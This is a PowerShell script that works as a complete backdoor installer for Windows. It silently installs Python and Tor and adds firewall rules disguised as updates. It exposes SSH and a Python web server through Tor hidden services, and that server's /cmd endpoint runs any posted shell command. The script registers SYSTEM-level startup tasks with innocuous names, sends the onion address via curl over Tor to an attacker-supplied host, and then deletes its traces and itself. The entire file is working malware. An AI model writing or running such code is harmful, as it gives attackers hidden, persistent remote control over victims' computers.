param (
    [string]$remoteAddress
)
$torURI = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.9/tor-expert-bundle-windows-x86_64-14.0.9.tar.gz"
$pythonURI = "https://www.python.org/ftp/python/3.13.3/python-3.13.3.exe"
$downloadPath = "$env:TEMP"
$installPath = Join-Path "$env:USERPROFILE" ".dotweb"
New-Item -ItemType Directory -Path $installPath -Force *>$null
$exfileName = "tmp.txt"
$exfile = $downloadPath+"\"+$exfileName 
$torDownloadOutFile = $downloadPath+"\tor.tar.gz"
$torTarFilePath = $downloadPath+"\tor.tar"
$torInstallDestPath = "$installPath\tor"
$torExe = $torInstallDestPath+"\tor\tor.exe" 
$torTorrc = "$torInstallDestPath\tor\torrc"
$pythonName = [System.IO.Path]::GetFileName($pythonURI)
$pyDownloadPath = Join-Path $downloadPath $pythonName
$pyScriptName = "pywin32.py"
$pythonFilePath = Join-Path $installPath $pyScriptName 
Invoke-WebRequest -Uri $pythonURI -OutFile $pyDownloadPath > $null 2>&1
Start-Process -FilePath $pyDownloadPath -ArgumentList `
    "/quiet", `
    "InstallAllUsers=1", `
    "PrependPath=1", `
    "Include_test=0", `
    "Include_pip=1" `
    -Wait -NoNewWindow
Invoke-WebRequest -Uri $torURI -OutFile $torDownloadOutFile > $null 2>&1
if (-Not (Test-Path $torInstallDestPath)) {
New-Item -ItemType Directory -Force -Path $torInstallDestPath > $null 2>&1
}
$gzStream = New-Object IO.Compression.GzipStream(
(New-Object IO.FileStream($torDownloadOutFile, [System.IO.FileMode]::Open)),
[IO.Compression.CompressionMode]::Decompress)
$tarStream = New-Object IO.FileStream($torTarFilePath, [System.IO.FileMode]::Create)
$gzStream.CopyTo($tarStream)
$gzStream.Close()
$tarStream.Close()
& "tar.exe" -xvf $torTarFilePath -C $torInstallDestPath > $null 2>&1
$pythonExe = Get-ChildItem -Path C:\ -Filter python.exe -Recurse -ErrorAction SilentlyContinue -Force | Select-Object -First 1 -ExpandProperty FullName
Remove-Item $pyDownloadPath -Force
New-NetFirewallRule -DisplayName "Allow Updates" -Direction Inbound -Program "$pythonFilePath" -Action Allow -Profile Any -Protocol TCP -LocalPort 8080 > $null 2>&1
netsh advfirewall firewall add rule name="Allow Updates" dir=in action=allow protocol=TCP localport=8080 program="$pythonFilePath" enable=yes > $null 2>&1
New-NetFirewallRule -DisplayName "Allow Updater" -Direction Inbound -Program "$pythonExe" -Action Allow -Profile Any -Protocol TCP -LocalPort 8080 > $null 2>&1
netsh advfirewall firewall add rule name="Allow Updater" dir=in action=allow protocol=TCP localport=8080 program="$pythonExe" enable=yes > $null 2>&1
$torrcContent = @"
SocksPort 9050

HiddenServiceDir $torInstallDestPath\service
HiddenServicePort 22 127.0.0.1:22

HiddenServiceDir $torInstallDestPath\web-service
HiddenServicePort 80 127.0.0.1:8080
"@
Set-Content -Path $torTorrc -Value $torrcContent -Encoding ASCII -Force
Start-Process -FilePath $torExe -ArgumentList "-f `"$torTorrc`"" -WindowStyle Hidden
Start-Sleep -Seconds 30
$sshHostNameFilePath = "$torInstallDestPath\service\hostname"
$webHostNameFilePath = "$torInstallDestPath\web-service\hostname"
$sshHostName = Get-Content -Path $sshHostNameFilePath -Raw
$webHostName = Get-Content -Path $webHostNameFilePath -Raw
$pythonScript = @"
import http.server
import socketserver
import os
import subprocess

PORT = 8080
DIRECTORY = os.path.expanduser("~")

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/cmd':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')

            result = subprocess.getoutput(post_data)
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(result.encode('utf-8'))

        elif self.path == '/upload':
            content_length = int(self.headers['Content-Length'])
            file_data = self.rfile.read(content_length)

            filename = "tmp"
            counter = 1
            while os.path.exists(filename):
                filename = f"tmp{counter}"
                counter += 1

            with open(filename, 'wb') as f:
                f.write(file_data)

            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(f"File uploaded as {filename}".encode('utf-8'))

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return  

os.chdir(DIRECTORY)

handler = RequestHandler
with socketserver.TCPServer(("", PORT), handler) as httpd:
    httpd.serve_forever()
"@
Set-Content -Path $pythonFilePath -Value $pythonScript -Encoding ASCII -Force
Start-Process $pythonExe $pythonFilePath -NoNewWindow
$taskName = "Win32Updater"
$action = New-ScheduledTaskAction -Execute $pythonExe -Argument "`"$pythonFilePath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Force *>$null
$taskName2 = "UpdateChecker"
$action2 = New-ScheduledTaskAction -Execute $torExe -Argument "-f `"$torTorrc`""
$trigger2 = New-ScheduledTaskTrigger -AtStartup
$principal2 = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $taskName2 -Trigger $trigger2 -Action $action2 -Principal $principal2 -Force *>$null
$exfileContent = @"
$webHostName
"@
Set-Content -Path $exfile -Value $exfileContent -Encoding ASCII -Force
Start-Sleep -Seconds 5
cmd.exe /c "curl --socks5-hostname 127.0.0.1:9050 -F file=@`"$exfile`" http://$remoteAddress/upload" >$null 2>&1
Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $exfile -Force
Remove-Item -Path $MyInvocation.MyCommand.Path -Force

